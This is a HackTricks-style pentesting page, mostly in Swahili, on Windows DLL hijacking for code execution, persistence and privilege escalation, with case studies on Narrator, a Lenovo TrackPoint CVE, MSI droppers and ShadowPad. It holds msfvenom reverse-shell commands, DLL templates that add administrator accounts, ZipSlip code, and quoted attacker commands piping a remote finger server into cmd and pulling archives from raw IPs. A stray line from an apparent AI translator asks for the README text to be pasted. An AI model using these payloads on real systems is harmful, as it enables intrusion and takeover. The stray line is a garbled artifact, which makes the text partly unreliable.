# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kudanganya programu yenye kuaminika ili ianze kupakia DLL hatari. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumiwa hasa kwa ajili ya utekelezaji wa code, kupata persistence, na, si mara nyingi, privilege escalation. Licha ya mkazo kwenye escalation hapa, mbinu ya hijacking inabaki kuwa ile ile kwa malengo tofauti.

### Njia za Kawaida

Kuna mbinu kadhaa zinazotumika kwa DLL hijacking, kila moja ikiwa na ufanisi wake kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halisi na moja hatari, hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL ya asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hatari katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hatari kwa programu ili iipakie, ikidhani ni DLL inayohitajika ambayo haipo.
4. **DLL Redirection**: Kubadilisha vigezo vya utafutaji kama `%PATH%` au files `.exe.manifest` / `.exe.local` kuelekeza programu kwenye DLL hatari.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na toleo hatari katika saraka ya WinSxS, mbinu inayohusiana mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hatari katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopiwa, ikifananishwa na Binary Proxy Execution techniques.

> [!TIP]
> Kwa mfululizo wa hatua-hatua unaozungusisha HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata DLL zilizokosekana

Njia ya kawaida zaidi ya kupata DLL zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, kwa **kutoa** **vichujio 2 vifuatavyo**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Kama unatafuta **missing dlls in general** uacha hii ikiendesha kwa **sekunde** kadhaa.\
Kama unatafuta **missing dll ndani ya executable maalum** unapaswa kuweka **kichujio kingine kama "Process Name" "contains" `<exec name>`, kuutekeleza, na kuacha kukamata matukio**.

## Kutumia DLL Zilizokosekana

Ili kuongeza mamlaka (privileges), nafasi bora tuliyonayo ni kuwa na uwezo wa **kuandika dll ambayo process yenye privileges itajaribu kuipakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hiyo, tunaweza **kuandika** dll katika **folda** ambapo **dll inatafutwa kabla** ya folda ambapo **dll ya asili** iko (hali ya ajabu), au tunaweza **kuandika katika folda fulani ambapo dll itatafutwa** na dll ya asili **haina** mahali popote.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kupata jinsi DLL zinavyopakuliwa kwa undani.**

**Windows applications** zinaangalia DLL kwa kufuata seti ya **pre-defined search paths**, zikifuatilia mfuatano maalum. Tatizo la DLL hijacking linapotokea ni wakati DLL hatari imewekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapakuliwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia njia kamili (absolute paths) inaporejelea DLL inazohitaji.

Unaweza kuona **DLL search order on 32-bit** systems hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huu ndio mfuatano wa utafutaji wa **default** ukiwa na **SafeDllSearchMode** imewezeshwa. Iwapo imezimwa, current directory inainuka hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kwa 0 (default ni enabled).

If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.

Mwishowe, kumbuka kwamba **dll inaweza kupakiwa ikitolewa path kamili badala ya jina pekee**. Katika kesi hiyo dll hiyo **itatafutwa tu katika path hiyo** (kama dll ina dependencies yoyote, zitatafutwa kama zilivyopakiwa kwa jina).

Kuna njia nyingine za kubadilisha mfuatano wa utafutaji lakini sitazitaja hapa.

### Kuchain hatua ya kuandika faili yoyote kuwa missing-DLL hijack

1. Tumia vichujio vya **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo process inajaribu kutafuta lakini haipati.
2. Iwapo binary inaendesha kwa **schedule/service**, kuacha DLL yenye moja ya majina hayo katika **application directory** (search-order entry #1) itapakuliwa wakati itakapotekelezwa mara nyingine. Katika mfano mmoja wa scanner ya .NET process ilitafuta `hostfxr.dll` katika `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza payload DLL (mfano reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Iwapo primitive yako ni **ZipSlip-style arbitrary write**, tengeneza ZIP ambayo entry yake inatoka nje ya extraction dir ili DLL iwe katika saraka ya app:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Peleka archive kwenye inbox/share inayotazamwa; wakati scheduled task itakaporusha tena mchakato, itaingia DLL ya uharibifu na itatekeleza msimbo wako kama service account.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya juu ya kuathiri kwa uhakika njia ya utafutaji ya DLL ya mchakato mpya uliotengenezwa ni kuweka uwanja wa DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa hapa saraka inayodhibitiwa na mshambuliaji, mchakato lengwa unaotatua DLL iliyoinuliwa kwa jina (hakuna absolute path na bila kutumia bendera za loading salama) unaweza kulazimishwa kuingiza DLL hatarishi kutoka kwenye saraka hiyo.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya kiutendaji
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Mbinu hii imeonekana katika mazingira halisi kutengeneza mnyororo wa sideloading wa hatua nyingi: launcher wa awali hutoa helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft na inayoweza kuibiwa (hijackable) yenye DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye saraka ya staging.


#### Exceptions on dll search order from Windows docs

Mabadiliko fulani kwa mpangilio wa kawaida wa utafutaji wa DLL yameripotiwa katika nyaraka za Windows:

- Wakati **DLL inayoshiriki jina na ile tayari iliyopakiwa kwenye memory** inapokutanawe, mfumo hupita utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurejea kwa DLL iliyo tayari kwenye memory. **Katika tukio hili, mfumo hautafanya utafutaji wa DLL**.
- Katika matukio ambapo DLL inatambuliwa kama **known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la known DLL, pamoja na yoyote ya DLL zake tegemezi, **akipitia bila utafutaji**. Kitufe cha rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** kinaorodhesha known DLL hizi.
- Ikiwa **DLL ina tegemezi**, utafutaji wa DLL hizo tegemezi unafanywa kana kwamba zilielezewa kwa kutumia tu **majina ya moduli**, bila kujali kama DLL ya awali ilitambulishwa kwa njia ya njia kamili.

### Kuinua Vibali

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi kwa **vibali tofauti** (kusogea kwa usawa au kwa upande), ambao **unakosa DLL**.
- Hakikisha kuna **uwezo wa kuandika** kwa yoyote ya **saraka** ambazo **DLL** itatafutwa. Mahali hapa kunaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, mahitaji ni magumu kuyapata kwani **kwa chaguo-msingi ni aina ya ajabu kupata executable yenye vibali vya juu bila DLL** na ni hata **ajabu zaidi kuwa na ruhusa za kuandika kwenye folda ya system path** (huna kwa chaguo-msingi). Hata hivyo, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Iwapo utakuwa na bahati na utapata kuwa unakidhi mahitaji, unaweza kuangalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata kama **main goal of the project is bypass UAC**, unaweza kupata huko **PoC** ya Dll hijaking kwa toleo la Windows unalotumia (labda kwa kubadilisha tu njia ya folda ambako una ruhusa za kuandika).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika folda** kwa kufanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili juu ya jinsi ya **abuse Dll Hijacking to escalate privileges** ukiwa na ruhusa za kuandika katika **System Path folder** angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itakagua ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utakutana na mazingira yanayoweza kutumika, moja ya mambo muhimu zaidi ili kuifaida kwa mafanikio itakuwa **kuunda dll inayotoa angalau functions zote ambazo executable itaziingiza kutoka kwake**. Pia, kumbuka kwamba Dll Hijacking inaweza kuwa muhimu ili [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking unaolenga dll hijacking kwa ajili ya utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** unaweza kupata baadhi ya **misimbo ya msingi ya dll** ambayo inaweza kuwa ya msaada kama **kiolezo** au kuunda **dll inayotoa functions zisizohitajika**.

## **Kuunda na kukusanya Dlls**

### **Dll Proxifying**

Kwa msingi, Dll proxy ni Dll inayoweza **kuendesha msimbo wako hatari inapopakuliwa** lakini pia **kuonyesha** na **kufanya kazi** kama ilivyotarajiwa kwa kupitisha simu zote kwa maktaba ya asili.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kuonyesha executable na kuchagua maktaba unayotaka ku-proxify na kuunda proxified dll, au kuonyesha Dll na kuunda proxified dll.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kwamba katika kesi kadhaa Dll unayoi-compile lazima **export several functions** ambazo zitapakiwa na victim process; ikiwa functions hizi hazipo, **binary won't be able to load** them na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
I don't have the contents of src/windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md — please paste the README.md text you want translated to Swahili.
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL mfano na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL mbadala ya C yenye thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Somo la Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado inachunguza DLL ya localization yenye njia inayotegemezeka kwa lugha maalum wakati wa kuanza ambayo inaweza kufanywa hijack kwa arbitrary code execution and persistence.

Mambo muhimu
- Njia ya uchunguzi (matoleo ya sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya kale (matoleo ya zamani): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayoweza kuandikwa na inayodhibitiwa na attacker ipo katika njia ya OneCore, inapakiwa na `DllMain(DLL_PROCESS_ATTACH)` inaendesha. Hakuna exports zinahitajika.

Ugundaji kwa Procmon
- Kichujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia njia iliyo hapo juu.

DLL ndogo
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC kimya
- Hijack rahisi itazungumza/kuangazia UI. Ili kubaki kimya, wakati wa kuambatisha orodha ya threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread`; endelea kwa thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa yafuatayo, kuanzisha Narrator kutapakia DLL iliyowekwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwa mwenyeji, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako itatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unaisha wakati kikao cha RDP kinapofungwa—inject/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kukopa entry ya registry ya built-in Accessibility Tool (AT) (mfano CursorIndicator), uibadilishe ili ielekee kwenye binary/DLL yoyote, uiingize, kisha weka `configuration` kwa jina hilo la AT. Hii inafanya proxy ya utekelezaji wowote ndani ya mfumo wa Accessibility.

Vidokezo
- Kuandika chini ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuishi katika `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Mfano huu unaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), iliyofuatiliwa kama **CVE-2025-1729**.

### Maelezo ya Udhaifu

- **Komponenti**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Kazi Iliyopangwa**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inakimbia kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyesajiliwa.
- **Directory Permissions**: Writable by `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili yoyote.
- **DLL Search Behavior**: Inajaribu kupakia `hostfxr.dll` kutoka kwa directory yake ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo wa kutafuta kwenye directory ya ndani.

### Utekelezaji wa Exploit

Mshambuliaji anaweza kuweka stub ya `hostfxr.dll` yenye madhara katika directory hiyo hiyo, akitumia DLL iliyokosekana kupata utekelezaji wa msimbo ndani ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ifanye kazi saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inapotekelezwa, DLL yenye madhara itaendesha katika kikao cha msimamizi kwa medium integrity.
4. Fanya mnyororo wa standard UAC bypass techniques ili kuinua kutoka medium integrity hadi SYSTEM privileges.

## Uchambuzi wa Kesi: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Watendaji wa vitisho mara nyingi huunganisha MSI-based droppers na DLL side-loading ili kutekeleza payloads chini ya mchakato uliothibitishwa na kusainiwa.

Chain overview
- Mtumiaji anapakua MSI. A CustomAction inafanya kazi kimya wakati wa usakinishaji wa GUI (mfano, LaunchApplication au vitendo vya VBScript), ikijenga tena hatua inayofuata kutoka kwa rasilimali zilizojengwa ndani.
- The dropper inaandika EXE halali, iliyosainiwa na DLL yenye madhara kwa saraka ile ile (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Look for multiple small fragments that are concatenated and decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
- wsc_proxy.exe: legitimate signed host (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka kwa saraka yake.
- wsc.dll: attacker DLL. Ikiwa hakuna exports maalum zinazohitajika, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na peleka exports zinazohitajika kwa maktaba halisi wakati payload inakimbizwa katika DllMain.
- Jenga payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia framework ya proxying (mfano, DLLirant/Spartacus) ili kuunda forwarding DLL ambayo pia inatekeleza payload yako.

- Mbinu hii inategemea utatuzi wa majina ya DLL na binary mwenyeji. Ikiwa mwenyeji anatumia absolute paths au safe loading flags (mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri kipaumbele na zinapaswa kuzingatiwa wakati wa kuchagua host binary na export set.

## Triadi zilizotiwa sahihi + payload zilizofichwa (uchambuzi wa kesi ya ShadowPad)

Check Point ilielezea jinsi Ink Dragon inavyoweka ShadowPad kwa kutumia **three-file triad** ili mchanganyike na programu halali huku ikihifadhi core payload iliyofichwa kwenye diski:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA wanatumiwa (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Wadukuzi wanarejesha jina la executable ili ionekane kama Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature inabaki kuwa halali.
2. **Malicious loader DLL** – inamezwa karibu na EXE kwa jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL hiyo kawaida ni MFC binary iliyofichwa kwa kutumia ScatterBrain framework; kazi yake pekee ni kutafuta encrypted blob, kuifungua, na reflectively map ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` katika saraka ile ile. Baada ya memory-mapping decrypted payload, loader huifuta faili ya TMP ili kuharibu ushahidi wa forensics.

Tradecraft notes:

* Kurejesha jina la EXE lililosainiwa (wakati ukihifadhi `OriginalFileName` ya asili kwenye PE header) kunaruhusu ikijifanya kuwa Windows binary lakini iwe na sahihi ya vendor, kwa hivyo rudia desturi ya Ink Dragon ya kuweka binaries zinazotokea `conhost.exe` ambazo kwa kweli ni utilities za AMD/NVIDIA.
* Kwa kuwa executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu DLL yako hatari iwe kando yake. Lenga kubinafsisha loader DLL; signed parent kwa kawaida inaweza kukimbia bila kubadilishwa.
* ShadowPad decryptor inatarajia TMP blob iwe kando ya loader na iwe imeandikwa (writable) ili iweze kuisafisha kwa zero baada ya mapping. Hifadhi saraka iwe writable hadi payload ianze; mara ikipo kwenye memory, faili ya TMP inaweza kufutwa kwa usalama kwa OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators wanachanganya DLL sideloading na LOLBAS ili kiini cha artefact maalum kwenye diski kiwe tu malicious DLL kando ya trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell inazaa `cmd.exe /c`, inavuta amri kutoka kwa Finger server, na kuzipipa kwa `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` huvuta TCP/79 text; `| cmd` inatekeleza majibu ya server, ikimruhusu operator kuzungusha second stage server-side.

- **Built-in download/extract:** Pakua archive yenye extension isiyo hatari, ifungua, na stage sideload target pamoja na DLL chini ya kifolder kisichotabirika cha `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` inaficha progress na inafuata redirects; `tar -xf` inatumia tar built-in ya Windows.

